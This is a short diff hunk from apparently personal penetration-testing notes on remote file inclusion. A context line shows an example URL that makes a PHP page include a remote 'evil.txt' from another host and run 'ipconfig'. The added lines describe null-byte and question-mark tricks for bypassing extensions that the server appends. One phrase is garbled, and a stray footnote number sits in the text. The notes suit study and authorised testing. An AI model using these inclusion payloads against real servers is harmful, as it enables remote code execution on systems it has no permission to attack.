@@ -717,3 +717,7 @@ Same as LFI but the referenced file is a remote one. Loading external files like
 ```
 http://10.11.0.22/menu.php?file=http://10.11.0.4/evil.txt&cmd=ipconfig
 ```
+
+File inclusion tricks:
+- Older versions of PHP have a vulnerability in which a null byte278 (%00) will terminate any string. This trick can be used to bypass file extensions added server-side and is useful for file inclusions because it prevents the file extension from being considered as part of the string. 
+End the file extension with a them with a question mark (?) to mark anything added to the URL server-side as part of the query string. 
